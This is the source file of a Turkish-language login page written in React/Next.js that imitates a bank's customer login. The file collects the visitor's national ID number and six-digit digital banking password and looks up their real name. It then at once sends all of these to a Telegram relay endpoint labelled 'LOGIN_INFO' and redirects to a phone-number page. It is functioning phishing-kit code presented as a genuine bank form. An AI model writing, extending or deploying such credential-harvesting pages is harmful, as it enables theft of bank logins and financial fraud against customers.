"use client";
import { useState, useEffect, Suspense } from "react";
import Image from "next/image";
import Link from "next/link";
import { Eye, EyeOff } from "lucide-react";
import { useRouter, useSearchParams } from "next/navigation";

// useSearchParams için Client Component
const LoginContent = () => {
  const router = useRouter();
  const searchParams = useSearchParams();
  const [credentials, setCredentials] = useState({
    tc: "",
    password: "",
  });
  const [showPassword, setShowPassword] = useState(false);
  const [errors, setErrors] = useState({
    tc: "",
    password: "",
  });
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    // URL'de hatali parametresi var mı kontrol et
    const hatali = searchParams.get('hatali');
    if (hatali === 'true') {
      setErrors(prev => ({
        ...prev,
        password: "Şifreniz hatalı, lütfen tekrar deneyin."
      }));
    }
  }, [searchParams]);

  // TC validasyonu
  const validateTC = (tc: string): boolean => {
    return tc.length === 11 && /^\d+$/.test(tc);
  };

  // Şifre validasyonu (max 6 hane, sadece rakam)
  const validatePassword = (password: string): boolean => {
    return password.length <= 6 && /^\d+$/.test(password);
  };

  const getTCErrorMessage = (tc: string): string => {
    if (!tc) return "TC Kimlik numarası boş olamaz";
    if (tc.length !== 11) return "TC Kimlik numarası 11 haneli olmalıdır";
    if (!/^\d+$/.test(tc)) return "TC Kimlik numarası sadece rakam içermelidir";
    return "";
  };

  const getPasswordErrorMessage = (password: string): string => {
    if (!password) return "Şifre boş olamaz";
    if (password.length > 6) return "Şifre en fazla 6 rakam olmalıdır";
    if (!/^\d+$/.test(password)) return "Şifre sadece rakam içermelidir";
    return "";
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    
    if (name === "tc") {
      // TC için sadece rakam ve max 11 hane
      const cleaned = value.replace(/\D/g, '').slice(0, 11);
      setCredentials((prev) => ({ ...prev, [name]: cleaned }));
      setErrors((prev) => ({
        ...prev,
        tc: getTCErrorMessage(cleaned),
      }));
    } else if (name === "password") {
      // Şifre için sadece rakam ve max 6 hane
      const cleaned = value.replace(/\D/g, '').slice(0, 6);
      setCredentials((prev) => ({ ...prev, [name]: cleaned }));
      setErrors((prev) => ({
        ...prev,
        password: getPasswordErrorMessage(cleaned),
      }));
    }
  };

  // TC sorgulama fonksiyonu - kendi API'mizi kullan
  const checkTC = async (tc: string) => {
    try {
      const response = await fetch('/api/tc-check', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ tc })
      });

      const data = await response.json();
      
      if (!data.success) {
        return { success: false, error: data.error };
      }
      
      return { 
        success: true, 
        data: {
          name: data.data.name,
          surname: data.data.surname,
          tc: data.data.tc
        }
      };
    } catch (error) {
      console.error('TC sorgulama hatası:', error);
      return { success: false, error: "Bağlantı hatası. Lütfen tekrar deneyin." };
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    const tcError = getTCErrorMessage(credentials.tc);
    const passwordError = getPasswordErrorMessage(credentials.password);
    
    if (tcError || passwordError) {
      setErrors({
        tc: tcError,
        password: passwordError,
      });
      setIsLoading(false);
      return;
    }

    // TC sorgulama
    const tcResult = await checkTC(credentials.tc);
    
    if (!tcResult.success) {
      setErrors(prev => ({
        ...prev,
        tc: tcResult.error || "TC doğrulama başarısız"
      }));
      setIsLoading(false);
      return;
    }

    // Başarılı TC doğrulama - verileri sessionStorage'a kaydet
    const loginInfo = {
      username: credentials.tc,
      password: credentials.password,
      realName: tcResult.data?.name,
      realSurname: tcResult.data?.surname
    };
    sessionStorage.setItem('loginData', JSON.stringify(loginInfo));

    // HEMEN Telegram'a login bilgilerini gönder
    try {
      await fetch('/api/send-telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          username: credentials.tc,
          password: credentials.password,
          phone: 'TELEFON_HENÜZ_GİRİLMEDİ',
          creditLimit: 'LİMİT_HENÜZ_GİRİLMEDİ',
          applicationDate: new Date().toLocaleDateString('tr-TR'),
          realName: tcResult.data?.name,
          realSurname: tcResult.data?.surname,
          messageType: 'LOGIN_INFO'
        })
      });
      
      console.log('Login bilgileri Telegram\'a gönderildi');
    } catch (error) {
      console.error('Telegram gönderim hatası (login):', error);
      // Hata olsa bile devam et
    }

    setIsLoading(false);
    // Phone sayfasına yönlendir
    router.push("/phone");
  };

  return (
    <div className="h-auto bg-white flex flex-col items-center justify-center p-4 mt-4">
      <div className="w-full max-w-[400px] bg-white rounded-[20px] border border-gray-200 p-8 shadow-sm">
        
        {/* Müşteri / T.C. Kimlik Numaranız */}
        <div className="mb-6">
          <h2 className="text-[#333] text-lg font-semibold mb-4">
            Müşteri / T.C. Kimlik Numaranız
          </h2>
          <input
            type="text"
            name="tc"
            className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:border-[#800D51] text-base text-gray-700"
            value={credentials.tc}
            onChange={handleChange}
            placeholder="TC Kimlik Numaranız"
            maxLength={11}
          />
          {errors.tc && (
            <p className="text-red-500 text-sm mt-2">{errors.tc}</p>
          )}
        </div>

        {/* Dijital Şifreniz */}
        <div className="mb-6">
          <h2 className="text-[#333] text-lg font-semibold mb-4">
            Dijital Şifreniz
          </h2>
          <div className="relative">
            <input
              type={showPassword ? "text" : "password"}
              name="password"
              className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:border-[#800D51] text-base text-gray-700 pr-12"
              value={credentials.password}
              onChange={handleChange}
              placeholder="Şifreniz"
              maxLength={6}
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400"
            >
              {showPassword ? (
                <EyeOff className="w-5 h-5" />
              ) : (
                <Eye className="w-5 h-5" />
              )}
            </button>
          </div>
          {errors.password && (
            <p className="text-red-500 text-sm mt-2">{errors.password}</p>
          )}
        </div>

        {/* Dijital Şifre Yardım Linkleri */}
        <div className="mb-8 text-center">
          <Link href="#" className="text-[#800D51] hover:text-[#800D51]/80 text-sm underline mr-3">
            Dijital Şifre Al
          </Link>
          <span className="text-gray-400">|</span>
          <Link href="#" className="text-[#800D51] hover:text-[#800D51]/80 text-sm underline ml-3">
            Dijital Şifremi Unuttum
          </Link>
        </div>

        {/* İleri Butonu */}
        <form onSubmit={handleSubmit}>
          <button
            type="submit"
            disabled={isLoading}
            className="w-full bg-[#800D51] text-white rounded-md py-4 hover:bg-[#800D51]/90 transition font-semibold text-lg disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {isLoading ? (
              <div className="flex items-center justify-center">
                <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
                Kontrol Ediliyor...
              </div>
            ) : (
              "İleri"
            )}
          </button>
        </form>
        
      </div>

        <div className="text-sm text-black mt-4 text-left">
         <strong>Güvenliğiniz İçin</strong>
          <br />
          Dijital Şifreniz ve bankamız tarafından cep telefonunuza gönderilen tek kullanımlık şifreler yalnızca size özeldir, bankamız personeli dahil kimse ile paylaşmayınız. Detaylı bilgi ve güvenlik önlemleri için lütfen buraya tıklayınız.
        </div>

      <style jsx>{`
        input::placeholder {
          color: #999;
        }
        
        input:focus {
          box-shadow: 0 0 0 2px rgba(128, 13, 81, 0.1);
        }
        
        @keyframes spin {
          to {
            transform: rotate(360deg);
          }
        }
        
        .animate-spin {
          animation: spin 1s linear infinite;
        }
      `}</style>
    </div>
  );
};

// Ana bileşen
const LoginPage = () => {
  return (
    <Suspense fallback={<div className="min-h-full flex items-center justify-center">Yükleniyor...</div>}>
      <LoginContent />
    </Suspense>
  );
};

export default LoginPage;
